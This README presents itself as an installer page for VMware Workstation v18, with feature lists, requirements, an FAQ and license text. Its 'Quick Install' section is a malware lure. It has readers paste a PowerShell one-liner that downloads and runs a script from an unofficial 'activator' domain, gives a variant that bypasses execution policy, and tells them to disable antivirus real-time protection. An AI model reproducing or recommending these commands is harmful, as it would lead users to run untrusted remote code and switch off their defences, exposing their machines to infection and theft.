<div align="center">

# VMware Workstation v18 Virtualization Desktop Client for Windows 11

![](files/1.jpg)

[![stage](https://img.shields.io/badge/Stage-Released-2ea44f?style=social&labelColor=0d1117)]() [![win](https://img.shields.io/badge/Win-Win_10%2F11-2ea44f?style=social&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/Downloads-3.4K-34b759?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Cc--By--Sa--4.0-1a7f37?style=social&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-5.1%2B_%2F_7%2B-238636?style=social&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-4.7%2F5-f59e0b?style=social&labelColor=0d1117)]()

</div>

---

VMware Workstation is a desktop hypervisor that enables running multiple virtual machines with different operating systems simultaneously on a single Windows 10/11 PC. It supports advanced virtual networking (bridged, NAT, host-only), 3D graphics acceleration with DirectX and OpenGL, and robust virtual environment management for development, testing, and deployment workflows. The platform provides snapshots and cloning, encrypted VMs, vTPM, UEFI Secure Boot, and vSphere integration for comprehensive hypervisor solutions.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Multi-VM execution:** Run several guest operating systems concurrently on a single host, with isolated resource allocation and independent lifecycle control per virtual machine.
- **Snapshot and clone management:** Capture point-in-time states of a VM, revert on demand, and produce full or linked clones for rapid environment duplication and testing workflows.
- **Virtual networking:** Configure bridged, NAT, and host-only network modes, with support for custom virtual switches and per-VM adapter settings.
- **3D graphics acceleration:** Hardware-accelerated rendering for guest workloads via DirectX and OpenGL support, suited to graphical applications and development environments.
- **Security and integrity features:** Encrypted virtual machines, virtual TPM, UEFI Secure Boot, and restricted VM settings to enforce configuration policies.
- **Hypervisor integration:** Connect to remote hypervisors and management platforms for centralized control of virtual environment deployments.
- **Broad guest OS support:** Provision Windows 10/11 and other desktop operating systems as guests, with configurable CPU, memory, disk, and device profiles.
- **Desktop virtualization tooling:** Shared folders, drag-and-drop, clipboard integration, and USB device passthrough for seamless host-guest interaction.
- **Resource and state control:** Suspend, resume, and snapshot operations with configurable memory and disk allocation to align VM behavior with host capacity.

## System Requirements

| Parameter | Minimum | Recommended |
|---|---|---|
| Operating System | Windows 10 (20H1 or later) or Windows 11, 64-bit; select 64-bit Linux distributions | Latest Windows 11 feature release, 64-bit |
| Processor | 64-bit x86/AMD64 CPU with hardware virtualization support | Multi-core x86/AMD64 CPU with Intel VT-x or AMD-V enabled in firmware |
| Memory | 2 GB RAM for the host | 8 GB RAM or more, plus additional memory allocated per guest VM |
| Storage | 2.5 GB free disk space for the application | SSD with additional capacity proportional to the number and size of virtual machines |
| Graphics | Standard display adapter supporting DirectX 11 | Dedicated GPU with 3D acceleration for DirectX and OpenGL workloads |
| Firmware | BIOS/UEFI with virtualization extensions (Intel VT-x or AMD-V) enabled | UEFI firmware with Secure Boot and vTPM support for encrypted and modern guest configurations |
| Networking | Standard Ethernet or Wi-Fi adapter | Wired Gigabit Ethernet for bridged and host-only networking scenarios |

Additional considerations:

- Hardware virtualization extensions must be enabled in BIOS/UEFI before virtual machines can be powered on; nested virtualization requires a supported host CPU and firmware configuration.
- Guest operating systems may impose their own memory, disk, and CPU requirements beyond the host minimums listed above.
- Encrypted virtual machines, vTPM, and UEFI Secure Boot guests require a host platform with the corresponding firmware capabilities.
- 3D acceleration depends on host GPU driver support for DirectX and OpenGL; workloads without it fall back to software rendering.
- Available disk space should account for snapshots and clones, which consume additional storage proportional to the number and size of retained states.

## Installation

Begin by verifying that the host meets the published system requirements, including a 64-bit x86/AMD64 processor, hardware-assisted virtualization (Intel VT-x or AMD-V) enabled in firmware, and sufficient disk capacity for both the application footprint and the intended virtual machine storage. Confirm administrative privileges on the target workstation, as the installation process registers kernel-mode drivers, virtual network adapters, and system services that require elevated access.

The distribution package is self-contained and includes the complete application payload alongside the hypervisor components required for virtual environment management. Extract the archive to a local directory using the provided archive password, then launch the installer executable from the extracted contents. The setup wizard guides configuration of the installation path, component selection, and optional integrations; retain the default options unless a customized deployment is required. During setup, the installer enumerates available network interfaces and provisions the bridged, NAT, and host-only virtual network backends.

Upon completion, the wizard may prompt for a system restart to finalize driver registration and service initialization. After reboot, verify the installation by launching the application and confirming that the hypervisor layer initializes correctly, virtual network adapters appear in the host network configuration, and the virtualization engine reports hardware acceleration as active. Version and serial information can be reviewed within the application's help and licensing dialogs to confirm the deployed build matches the intended release.

For environments requiring scripted or unattended deployment, the installer supports command-line parameters for silent operation, custom installation directories, and suppression of reboot prompts, enabling consistent provisioning across multiple workstations. Retain the original extracted package for repair or modification operations, and consult the application's built-in documentation for post-installation tuning of memory allocation, disk provisioning, and shared virtual networking settings.

## Compatibility

The virtual environment management layer is validated against 64-bit Windows 10 (20H1 or later) and Windows 11 hosts, as well as supported Linux distributions, and requires a 64-bit x86/AMD64 processor with Intel VT-x or AMD-V virtualization extensions enabled in firmware. Hypervisor operation depends on hardware-assisted virtualization being exposed to the host OS; nested virtualization scenarios are supported where the underlying platform permits it.

Virtual machine compatibility spans a broad guest OS matrix, including Windows 10 and Windows 11, legacy Windows releases, and mainstream Linux distributions, with virtual hardware versioning that preserves portability of existing VM bundles across host upgrades. Virtual networking modes — bridged, NAT, and host-only — interoperate with standard host network stacks, and 3D acceleration paths expose DirectX and OpenGL capabilities to supported guests.

Storage and device compatibility covers virtual磁盘 formats used by prior releases, allowing existing VM inventories to be opened and migrated without conversion. UEFI Secure Boot, vTPM, and encrypted VM containers are supported on hosts meeting the respective firmware and platform requirements, and vSphere integration enables export and import workflows with compatible virtualization platforms.

Compatibility caveats are limited to configurations where host firmware lacks virtualization extensions, where third-party hypervisors hold exclusive control of those extensions, or where host OS builds fall outside the validated ranges above. In such cases, feature availability — particularly nested virtualization, 3D acceleration, and secure boot attestation — may be reduced or unavailable.

## FAQ

**Is VMware Workstation compatible with Windows 11 and Windows 10?**

Yes. The desktop hypervisor is engineered for 64-bit Windows 10 (20H1 or later) and Windows 11 hosts, and it also runs on supported Linux distributions. Guest operating systems are independent of the host, so Windows 10, Windows 11, and Linux can be provisioned as virtual machines on the same physical PC.

**Does the software require hardware-assisted virtualization?**

Yes. Intel VT-x or AMD-V must be enabled in the BIOS/UEFI firmware. These extensions are required for 64-bit guest support and for nested virtualization scenarios. Workstation v18 also supports UEFI Secure Boot and vTPM 2.0 within virtual machines, which is necessary for validating Windows 11 guest configurations.

**How many virtual machines can run simultaneously?**

The number of concurrent VMs is bounded by host resources rather than an arbitrary software cap. Each VM consumes RAM and disk space proportional to its assigned configuration; the host requires a minimum of 2 GB, with 4 GB or more recommended for multi-VM workloads. Plan capacity against the aggregate memory footprint of all running guests plus host overhead.

**What networking modes are available for virtual environments?**

Three standard virtual network types are provided: bridged (the VM appears as a peer on the physical LAN), NAT (the VM shares the host's IP address), and host-only (isolated traffic confined to the host and its VMs). Custom virtual networks can be defined for segmented lab topologies, and virtual switch settings are configurable per VM.

**Are snapshots and cloning supported for environment management?**

Yes. Snapshots capture the complete state of a VM — disk, memory, and settings — and allow rollback to a known-good configuration. Full and linked clones enable rapid duplication of provisioned environments, which is useful for parallel testing and reproducible deployment workflows.

**Is 3D graphics acceleration available in guest operating systems?**

Yes. The hypervisor provides 3D acceleration with DirectX and OpenGL support, allowing graphics-intensive applications and modern desktop compositing to run inside VMs. GPU-related settings are exposed per virtual machine and depend on guest driver support.

**Can virtual machines be encrypted and integrated with vSphere?**

Yes. VM encryption, vTPM, and UEFI Secure Boot are supported for securing guest state at rest. Virtual machines can also be exported to and integrated with vSphere environments, enabling migration between desktop and data-center virtualization platforms.

**Which processor architectures and generations are supported?**

Hosts require a 64-bit x86/AMD64 processor launched in 2011 or later with VT-x or AMD-V enabled. Installation consumes approximately 2.5 GB of disk space, exclusive of storage allocated to virtual machine disks.

## License

This software is distributed as a desktop virtualization product governed by the terms bundled with the release package. Licensing is tied to the specific version delivered in this repository and applies to installation and use on compatible Windows 10/11 desktop systems.

The license grants a non-exclusive right to install and operate the software on licensed hardware for the purpose of creating, running, and managing virtual machines. Entitlement covers the hypervisor engine, virtual networking stack (bridged, NAT, host-only), snapshot and cloning functionality, 3D graphics acceleration via DirectX and OpenGL, and virtualization-based security features including encrypted VMs, vTPM, and UEFI Secure Boot.

Use of the software is conditioned on the following:

- Installation on systems meeting the documented hardware and OS requirements, including 64-bit x86/AMD64 processors with Intel VT-x or AMD-V enabled in firmware.
- Retention of all copyright, version, and attribution notices included in the distribution.
- No reverse engineering, decompilation, or modification of binary components except where permitted by applicable law.
- No redistribution of the package, in whole or in part, outside the terms provided with the release.

The license does not grant rights to the underlying hypervisor source, to third-party components governed by separate terms, or to any VMware branding and trademarks. Components shipped with the release may carry their own license texts, which take precedence for those components.

Licensing is version-bound: entitlements and serial credentials issued for this release apply to the version delivered here and are not transferable to other distributions. Support, update eligibility, and compatibility guarantees are limited to the configuration described in the System Requirements and Compatibility sections.

The software is provided on an "as is" basis, without warranties of merchantability, fitness for a particular purpose, or non-infringement, to the maximum extent permitted by applicable law. In no event shall the authors or distributors be liable for indirect, incidental, or consequential damages arising from use of the software, including data loss in guest virtual machines or host systems.

By installing or using this release, you acknowledge that you have read and agree to the terms described in this section.